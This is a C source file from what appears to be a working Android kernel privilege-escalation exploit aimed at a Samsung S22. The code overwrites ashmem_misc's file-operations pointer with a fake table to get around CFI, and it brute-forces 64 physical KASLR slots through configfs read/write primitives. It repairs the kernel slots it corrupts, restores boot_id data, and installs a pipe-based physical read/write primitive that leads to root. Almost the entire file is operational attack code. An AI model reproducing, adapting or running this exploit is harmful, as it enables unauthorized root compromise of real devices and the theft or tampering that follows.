#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

/*
 * The in-process pselect route (do_pselect_fake_lock_route, fd_set stamp,
 * burst consumer) was removed for s22: under TCG the consumer can fire
 * after do_select's return writeback clobbers the stale waiter, and the
 * chain walk then dereferences garbage (the QEMU panic at
 * ffffff8026fffab0).  The fops hijack now runs through the exp32 route —
 * see targets/s22/main.c (doreplacefops) and src/exp32/.
 */

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;


static unsigned long long rmg_trace3_us(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
    return 0;
  return (unsigned long long)ts.tv_sec * 1000000ULL +
         (unsigned long long)ts.tv_nsec / 1000ULL;
}

static const char *rmg_trace3_class(ssize_t ret, uint64_t value,
                                    uintptr_t want) {
  if (ret != (ssize_t)sizeof(value)) return "READ_FAILED";
  if (value == (uint64_t)want) return "EXPECTED";
  if (value == 0) return "ZERO";
  if (value == 1) return "ONE";
  return "OTHER";
}

static const char *rmg_trace3_postwrite(ssize_t ret, uint64_t value,
                                        uintptr_t want) {
  if (ret != (ssize_t)sizeof(value)) return "UNVERIFIED";
  if (value == (uint64_t)want) return "EXPECTED";
  return "NONEXPECTED_READ";
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

/* .read is sprayed as 0 so the PI-chain walk's rb_next() stops at the fake
 * fops table instead of descending into kernel .text (see put_fake_fops_table).
 * Once ashmem_misc.fops == fake_fops, restore configfs_read_file through the
 * bin-write primitive (needs only the intact .write slot). */
int repair_fake_fops_read(int fd) {
  uint64_t cfg_read = text_addr(CONFIGFS_READ_ITER);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_READ_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &cfg_read, sizeof(cfg_read));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(cfg_read) &&
         rd == (ssize_t)sizeof(after) &&
         after == cfg_read;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA + p0_phys_slide_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_LOGGERS_0_1 + p0_phys_slide_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

/* TRACE6: resolve the physical KASLR slot independently of the virtual
 * tracefs slide. The exact GZB2 sboot has 64 physical slots at 0x8000
 * granularity. After the exp32 canonical write has fired, the correct
 * direct-map alias of ashmem_misc.fops must contain this attempt's fake_fops.
 *
 * We only SELECT on an exact fake_fops match. Reads from other slots are
 * observation-only. This avoids treating a zero/random qword at a wrong
 * alias as evidence that misc.fops itself is corrupt. */
static int trace6_resolve_phys_slot(int fd, uintptr_t *target_out,
                                    uint64_t *value_out, ssize_t *ret_out) {
  const uintptr_t granule = 0x8000ULL;
  const int slots = 64;
  int readable = 0;
  int zero_reads = 0;
  int other_reads = 0;

  p0_phys_slide_known = 0;
  p0_phys_slide_offset = 0;
  p0_phys_slot = -1;

  for (int slot = 0; slot < slots; slot++) {
    uintptr_t phys_slide = (uintptr_t)slot * granule;
    uintptr_t target = p0_data_alias_with_slide(ASHMEM_MISC_FOPS, phys_slide);
    uint64_t value = 0;
    errno = 0;
    ssize_t rd = configfs_read_once(fd, target, &value, sizeof(value));
    int rd_errno = errno;

    if (rd == (ssize_t)sizeof(value)) {
      readable++;
      if (value == 0)
        zero_reads++;
      else if (value != fake_fops)
        other_reads++;
    }

    if (rd == (ssize_t)sizeof(value) && value == fake_fops) {
      p0_phys_slide_offset = phys_slide;
      p0_phys_slide_known = 1;
      p0_phys_slot = slot;
      *target_out = target;
      *value_out = value;
      *ret_out = rd;
      pr_success("[cfi-trace6-physbase] PHYS_SLOT_MATCH slot=%d "
                 "phys_slide=%08zx target=%016zx value=%016llx "
                 "virtual_slide=%016llx\n",
                 slot, phys_slide, target, (unsigned long long)value,
                 (unsigned long long)kaslr_slide);
      return 1;
    }

    /* Keep the log useful without dumping all 64 slots every attempt. */
    if (rd == (ssize_t)sizeof(value) && value != 0) {
      pr_info("[cfi-trace6-physbase] slot-observe slot=%d phys_slide=%08zx "
              "target=%016zx value=%016llx errno=%d\n",
              slot, phys_slide, target, (unsigned long long)value, rd_errno);
    }
  }

  pr_warning("[cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=%d/64 "
             "zero=%d other=%d fake=%016zx virtual_slide=%016llx "
             "action=next-child continue=1\n",
             readable, zero_reads, other_reads, fake_fops,
             (unsigned long long)kaslr_slide);
  return 0;
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = 0;
  uint64_t pre_fops = 0;
  ssize_t pre_rb = -1;
  if (!trace6_resolve_phys_slot(fd, &misc_fops, &pre_fops, &pre_rb)) {
    /* Do not guess a direct-map slot and do not stop the outer supervisor. */
    cfi_last_step = 41;
    cfi_last_errno = errno;
    SYSCHK(close(fd));
    return 0;
  }
  pr_info("[cfi-trace6-physbase] address-domains physical_slot=%d "
          "physical_slide=%08zx virtual_slide=%016llx "
          "data_alias=%016zx canonical_target=%016zx\n",
          p0_phys_slot, p0_phys_slide_offset,
          (unsigned long long)kaslr_slide, misc_fops,
          canon_addr(ASHMEM_MISC_FOPS));
  const char *rmg_class = rmg_trace3_class(pre_rb, pre_fops, fake_fops);
  const char *rmg_postwrite = rmg_trace3_postwrite(pre_rb, pre_fops, fake_fops);
  size_t rmg_obj_idx = page_base && last_leaked_mm >= page_base
      ? (size_t)((last_leaked_mm - page_base) / MM_STRUCT_SZ)
      : (size_t)-1;
  pr_info("[cfi-trace4] t_us=%llu cpu=%d cycle=%d class=%s postwrite=%s "
          "ret=%zd target=%016zx read=%016llx want=%016zx "
          "mm=%016zx page=%016zx object_index=%zu reclaim=%d/%d "
          "send_bytes=%zu errno=%d\n",
          rmg_trace3_us(), sched_getcpu(), cfi_attempts, rmg_class,
          rmg_postwrite, pre_rb, misc_fops, (unsigned long long)pre_fops,
          fake_fops, last_leaked_mm, page_base, rmg_obj_idx,
          last_skb_reclaim_sent, last_skb_reclaim_want,
          last_skb_send_size, errno);
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    int mismatch_errno = errno;
    uint64_t original_fops_expected = canon_addr(ASHMEM_FOPS);

    if (pre_rb == (ssize_t)sizeof(pre_fops)) {
      if (pre_fops == original_fops_expected) {
        pr_info("[cfi-trace5-cleanup] state=CLEAN_ORIGINAL target=%016zx "
                "read=%016llx expected_original=%016llx action=none\n",
                misc_fops, (unsigned long long)pre_fops,
                (unsigned long long)original_fops_expected);
      } else {
        uint64_t cleanup_after = 0;
        errno = 0;
        ssize_t cleanup_wr = configfs_write_once(
            fd, misc_fops, &original_fops_expected,
            sizeof(original_fops_expected));
        int cleanup_wr_errno = errno;
        errno = 0;
        ssize_t cleanup_rd = configfs_read_once(
            fd, misc_fops, &cleanup_after, sizeof(cleanup_after));
        int cleanup_rd_errno = errno;
        const char *cleanup_state =
            cleanup_wr == (ssize_t)sizeof(original_fops_expected) &&
            cleanup_rd == (ssize_t)sizeof(cleanup_after) &&
            cleanup_after == original_fops_expected
                ? "RESTORED"
                : (cleanup_wr == (ssize_t)sizeof(original_fops_expected)
                       ? "RESTORE_UNVERIFIED"
                       : "RESTORE_FAILED");

        cfi_restore_ret = cleanup_wr;
        if (cleanup_rd == (ssize_t)sizeof(cleanup_after))
          fops_after = cleanup_after;

        pr_warning("[cfi-trace5-cleanup] state=CORRUPT target=%016zx "
                   "read=%016llx fake=%016zx original=%016llx "
                   "cleanup=%s wr=%zd wr_errno=%d rd=%zd rd_errno=%d "
                   "after=%016llx continue=1\n",
                   misc_fops, (unsigned long long)pre_fops, fake_fops,
                   (unsigned long long)original_fops_expected,
                   cleanup_state, cleanup_wr, cleanup_wr_errno,
                   cleanup_rd, cleanup_rd_errno,
                   (unsigned long long)cleanup_after);
      }
    } else {
      pr_warning("[cfi-trace5-cleanup] state=READ_FAILED target=%016zx "
                 "ret=%zd action=none continue=1\n",
                 misc_fops, pre_rb);
    }

    errno = mismatch_errno;
    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
               "read=%016llx want=%016zx errno=%d\n",
               pre_rb, misc_fops, (unsigned long long)pre_fops,
               fake_fops, mismatch_errno);
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = mismatch_errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  /* exp32 rb-write collateral: fake_fops.llseek (+0x08, the "parent"
   * rb node's rb_right during the one-child erase) now holds the write
   * target address.  Repair it through the intact .write slot before any
   * VFS path can consume it. */
  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }

  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
